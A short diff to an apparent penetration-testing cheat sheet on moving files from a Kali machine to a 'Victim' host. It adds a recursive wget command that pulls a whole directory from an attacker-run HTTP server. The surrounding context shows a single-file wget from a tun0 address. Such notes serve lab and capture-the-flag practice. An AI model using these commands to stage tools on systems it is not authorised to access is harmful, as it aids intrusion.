@@ -82,6 +82,12 @@ On Victim:
 wget http://<tun0_ip_here>:8000/<file_name_here> <file_name_here>
 ```
 
+#### Or, to transfer an entire directory, use:
+
+```
+wget -r http://192.168.76.146:8000/stack
+```
+
 ### Curl
 
 On Kali:
